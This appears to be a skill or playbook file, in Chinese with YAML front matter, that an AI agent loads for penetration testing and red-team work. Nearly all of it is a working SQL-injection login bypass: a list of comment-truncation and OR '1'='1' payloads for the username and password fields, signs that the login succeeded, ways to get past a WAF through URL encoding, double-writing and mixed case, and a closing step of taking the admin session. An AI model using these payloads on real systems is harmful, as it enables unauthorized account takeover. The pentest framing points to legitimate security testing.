---
name: sql-auth-bypass-comment
description: 利用SQL注释符截断后端查询实现认证绕过
when: 认证绕过, 登录, sql注入, 绕过
modes: pentest, redteam
x-source-session: 20261101_161427_f5102d_pentest
---

1. 对登录表单的 username/password 参数分别测试 SQL 注入点。
2. 常用认证绕过 payload（MySQL/MSSQL）：
   - username: admin'-- （减号后需空格）
   - username: admin'#
   - username: admin'/*
   - username: admin' OR '1'='1'--
   - password: ' OR '1'='1'--
   - password: admin' OR '1'='1'#
3. 验证成功标志：响应 302 跳转或页面内容变化显示已登录。
4. 如果安全等级较高有WAF/过滤，尝试编码绕过：URL编码（%27、%23）、双写、大小写混合等。
5. 确认绕过后获取管理会话，评估后续可访问的功能与权限。